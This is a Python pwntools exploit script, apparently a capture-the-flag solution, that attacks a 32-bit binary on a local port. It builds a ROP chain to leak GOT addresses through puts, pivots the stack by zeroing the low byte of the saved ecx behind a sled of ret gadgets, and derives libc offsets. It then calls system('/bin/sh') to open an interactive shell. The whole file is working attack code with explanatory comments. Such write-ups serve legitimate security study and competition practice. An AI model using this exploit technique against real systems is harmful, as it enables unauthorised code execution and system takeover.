from pwn import *

# io = process("./main")
io = remote("127.0.0.1", 4004)

io.readuntil("able?\n")

# gdb.attach(io, gdbscript = "b *0x0804921e\nc")
# input("[ENTER]")

# gadgets:
# 0x0804901e : pop ebx ; ret

# 0x0804921e <+75>:	pop    ecx
# 0x0804921f <+76>:	pop    ebx
# 0x08049220 <+77>:	pop    ebp
# 0x08049221 <+78>:	lea    esp,[ecx-0x4]
# 0x08049224 <+81>:	ret

# In the beginning of main() stack frame, ecx is saved to the stack and later esp is restored using ecx to find the location
# of the saved return address on the stack. Therefore, if we overwrite the return address, we will overwrite saved ecx and esp
# will point to bad memory before returning. Thus, we will only overwrite the LSB of saved ecx to 0 and hope that after loading esp
# from the saved ecx, it will fall inside our ROP chain. I also used ret-sleds (a chain of single 'ret' gadgets) before the ROP
# payload to increase the chance of success. This exploit is not 100% reliable and will work after some tries.
# Also, the libc used by the remote challenge was given later in the competition, but I didn't check discord, so I leaked addresses from GOT
# and found the libc using https://libc.rip myself :)

puts_plt = 0x08049050
gets_plt = 0x08049040
pop_ebx = 0x0804901e
GOT = 0x804c000
main = 0x080491d3
ret = 0x08049224	# single ret instruction
stack_pivot_gadget = 0x0804921e
data_section = 0x804cf00

rop1 = p32(puts_plt)
rop1 += p32(pop_ebx)
rop1 += p32(GOT)
rop1 += p32(gets_plt)
rop1 += p32(pop_ebx)
rop1 += p32(data_section)
rop1 += p32(stack_pivot_gadget)
rop1 += p32(data_section + 4)
rop1 += b"A" * 8
# when we send a payload of length 0x50, gets() will automatically write a \0 at the
# position after it which is the LSB of the saved ecx
rop1 = ((0x50 - len(rop1)) // 4) * p32(ret) + rop1

io.sendline(rop1)

GOT_leak = io.recv(16)
print("GOT leak:", GOT_leak)
if (len(GOT_leak) < 16):
	print("GOT leak failed")
	exit()
libc_start_main = u32(GOT_leak[:4])
libc_gets = u32(GOT_leak[4:8])
libc_puts = u32(GOT_leak[8:12])
libc_setvbuf = u32(GOT_leak[12:16])
print("libc_start_main, gets, puts, setvbuf =", hex(libc_start_main), hex(libc_gets), hex(libc_puts), hex(libc_setvbuf))
# sample output: libc_start_main, gets, puts, setvbuf = 0xf7d652d0 0xf7db6440 0xf7db6db0 0xf7db7490

# offsets look similar to libc6_2.36-8_i386 (found using https://libc.rip)
libc_base = libc_start_main - 0x232d0
libc_system = libc_base + 0x4c800
libc_bin_sh = libc_base + 0x1b5faa

# local libc
# libc_base = libc_start_main - 0x21560
# libc_system = libc_base + 0x48150
# libc_bin_sh = libc_base + 0x1bd0f5

rop2 = p32(libc_system)
rop2 += b"AAAA"
rop2 += p32(libc_bin_sh)

io.sendline(rop2)
io.interactive()
